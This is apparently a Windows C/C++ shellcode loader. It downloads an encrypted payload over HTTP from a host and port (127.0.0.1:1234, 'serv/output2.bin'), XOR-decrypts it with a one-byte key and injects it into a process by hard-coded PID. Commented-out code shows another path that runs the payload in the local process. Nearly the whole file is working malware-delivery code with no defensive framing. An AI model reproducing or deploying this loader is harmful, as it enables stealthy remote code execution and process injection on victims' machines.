#include <stdio.h>
#include <windows.h>
#include "utils.h"
#include "inject.h"
#include "http.h"
#include <iostream>

const unsigned char encryptionKey = 0xAA;
DWORD pid = 7512;

int main()
{
    const SIZE_T sPayloadSize = 433;

    LPSTR shell = Data(L"127.0.0.1", 1234, L"serv/output2.bin");

    void* addr = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    size_t bytesWritten = 0;
    if (addr == 0) {
        return 1;
    }

    const size_t SHELLCODE_SIZE = sPayloadSize; //sizeof(shell);

    //const unsigned char KEY[] = {0xAA, 0x58, 0x31, 0x64}; 
    /*const size_t KEY_SIZE = sizeof(KEY);*/

    UCHAR decryptedPayload[SHELLCODE_SIZE] = {};

    for (size_t i = 0; i < sPayloadSize; ++i) {
        decryptedPayload[i] = shell[i] ^ encryptionKey;
    }

    //UCHAR decryptedPayload[SHELLCODE_SIZE] = {};

    //for (size_t i = 0; i < sPayloadSize; ++i) {
    //    decryptedPayload[i] = shell[i] ^ encryptionKey;
    //}
    //for (size_t i = 0; i < SHELLCODE_SIZE - 1; ++i) {
    //    decryptedPayload[i] = shell[i] ^ KEY[i % KEY_SIZE];

    //    printf("/%x", decryptedPayload[i]);
    //};


    

    /*InjectShellcode(shell, SHELLCODE_SIZE, pid);*/

    InjectShellcode(decryptedPayload, SHELLCODE_SIZE, pid);

    printf("%s", shell);

    //WriteProcessMemory(GetCurrentProcess(), addr, decryptedPayload, sPayloadSize, &bytesWritten);

    //DWORD dwPro;
    //VirtualProtect(addr, sPayloadSize, PAGE_EXECUTE_READ, &dwPro);

    //CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);

    Sleep(10000);
    //void (*ret)() = (void(*)())addr;
    //ret();

   //VirtualFree(addr, 0, MEM_RELEASE);
}